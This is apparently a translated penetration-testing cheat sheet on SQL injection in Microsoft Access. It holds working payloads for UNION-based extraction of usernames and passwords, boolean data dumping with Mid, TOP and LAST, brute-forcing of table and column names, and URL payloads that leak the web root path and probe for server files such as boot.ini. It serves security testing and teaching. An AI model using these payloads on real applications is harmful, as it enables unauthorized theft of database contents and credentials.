# MS Access SQL Injection

{{#include ../../banners/hacktricks-training.md}}

## Online Playground

- [https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format&ss=-1)

## DB Limitations

### String Concatenation

Konkatenacija stringova je moguća sa `& (%26)` i `+ (%2b)` karakterima.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Коментари

У MS Access-у нема коментара, али очигледно је могуће уклонити последњи део упита помоћу NULL карактера:
```sql
1' union select 1,2 from table%00
```
Ako ovo ne funkcioniše, uvek možete ispraviti sintaksu upita:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Stacked Queries

Nisu podržane.

### LIMIT

Operator **`LIMIT`** **nije implementiran**. Međutim, moguće je ograničiti rezultate SELECT upita na **prvih N redova tabele koristeći operator `TOP`**. `TOP` prihvata kao argument ceo broj, koji predstavlja broj redova koji treba da budu vraćeni.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
Baš kao i TOP, možete koristiti **`LAST`** koji će dobiti **redove sa kraja**.

## UNION Upiti/Sub upiti

U SQLi obično želite na neki način izvršiti novi upit da biste izvukli informacije iz drugih tabela. MS Access uvek zahteva da se u **subupitima ili dodatnim upitima označi `FROM`**.\
Dakle, ako želite da izvršite `UNION SELECT` ili `UNION ALL SELECT` ili `SELECT` unutar zagrade u uslovu, uvek **morate označiti `FROM` sa validnim imenom tabele**.\
Stoga, morate znati **validno ime tabele**.
```sql
-1' UNION SELECT username,password from users%00
```
### Chaining equals + Substring

> [!WARNING]
> Ovo će vam omogućiti da exfiltrirate vrednosti trenutne tabele bez potrebe da znate ime tabele.

**MS Access** omogućava **čudnu sintaksu** kao što je **`'1'=2='3'='asd'=false`**. Kao što obično SQL injekcija će biti unutar **`WHERE`** klauzule, možemo to zloupotrebiti.

Zamislite da imate SQLi u MS Access bazi podataka i znate (ili ste pogodili) da je jedno **ime kolone username**, i to je polje koje želite da **exfiltrirate**. Mogli biste proveriti različite odgovore web aplikacije kada se koristi tehnika chaining equals i potencijalno exfiltrirati sadržaj sa **boolean injection** koristeći **`Mid`** funkciju za dobijanje podstringova.
```sql
'=(Mid(username,1,3)='adm')='
```
Ako znate **ime tabele** i **kolone** koju želite da izvučete, možete koristiti kombinaciju između `Mid`, `LAST` i `TOP` da **izvučete sve informacije** putem boolean SQLi:
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Feel free to check this in the online playground._

### Brute-forcing imena tabela

Korišćenjem tehnike povezivanja jednakosti možete takođe **bruteforce-ovati imena tabela** sa nečim poput:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
Možete takođe koristiti tradicionalniji način:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Feel free to check this in the online playground._

- Sqlmap uobičajeni nazivi tabela: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
- Postoji još jedna lista na [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### Brute-Forcing naziva kolona

Možete **brute-force trenutne nazive kolona** koristeći trik sa povezivanjem jednakosti sa:
```sql
'=column_name='
```
Ili sa **group by**:
```sql
-1' GROUP BY column_name%00
```
Ili možete koristiti brute-force za imena kolona **druge tabele** sa:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Dumping data

Već smo razgovarali o [**tehnici povezivanja jednakosti**](ms-access-sql-injection.md#chaining-equals-+-substring) **za iskopavanje podataka iz trenutne i drugih tabela**. Ali postoje i drugi načini:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
Ukratko, upit koristi "if-then" izjavu kako bi aktivirao "200 OK" u slučaju uspeha ili "500 Internal Error" u suprotnom. Iskorišćavanjem TOP 10 operatora, moguće je izabrati prvih deset rezultata. Naknadna upotreba LAST omogućava da se razmatra samo 10. tuple. Na takvoj vrednosti, koristeći MID operator, moguće je izvršiti jednostavnu uporedbu karaktera. Pravilnom promenom indeksa MID i TOP, možemo izvući sadržaj polja "username" za sve redove.

### Time Based

Check [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](<https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN>)

### Other Interesting functions

- `Mid('admin',1,1)` uzmi podstring sa pozicije 1 dužine 1 (početna pozicija je 1)
- `LEN('1234')` uzmi dužinu stringa
- `ASC('A')` uzmi ascii vrednost karaktera
- `CHR(65)` uzmi string iz ascii vrednosti
- `IIF(1=1,'a','b')` if then
- `COUNT(*)` prebroj broj stavki

## Enumerating tables

From [**here**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) you can see a query to get tables names:
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
Međutim, imajte na umu da je vrlo tipično pronaći SQL Injection gde **nemate pristup za čitanje tabele `MSysObjects`**.

## Pristup fajl sistemu

### Potpuna putanja do web root direktorijuma

Znanje o **apsolutnoj putanji web root-a može olakšati dalja napada**. Ako greške aplikacije nisu potpuno sakrivene, putanja direktorijuma može biti otkrivena pokušavajući da izaberete podatke iz nepostojeće baze podataka.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access odgovara sa **porukom o grešci koja sadrži punu putanju web direktorijuma**.

### Enumeracija fajlova

Sledeći vektorski napad može se koristiti za **inferisanje postojanja fajla na udaljenom fajl sistemu**. Ako navedeni fajl postoji, MS Access aktivira poruku o grešci koja obaveštava da je format baze podataka nevažeći:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

Drugi način za enumeraciju fajlova sastoji se u **navođenju stavke database.table**. **Ako** navedeni **fajl postoji**, MS Access prikazuje **poruku o grešci formata baze podataka**.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### Pogađanje imena .mdb fajla

**Ime fajla baze podataka (.mdb)** može se inferirati sledećim upitom:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

Gde je **name\[i] ime .mdb fajla** i **realTable je postojeća tabela** unutar baze podataka. Iako će MS Access uvek aktivirati poruku o grešci, moguće je razlikovati između nevažećeg imena fajla i važećeg .mdb imena fajla.

### .mdb alat za otkrivanje lozinki

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) je besplatna alatka koja se može koristiti za oporavak glavne lozinke baze podataka Microsoft Access 95/97/2000/XP ili Jet Database Engine 3.0/4.0.

## Reference

- [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

{{#include ../../banners/hacktricks-training.md}}
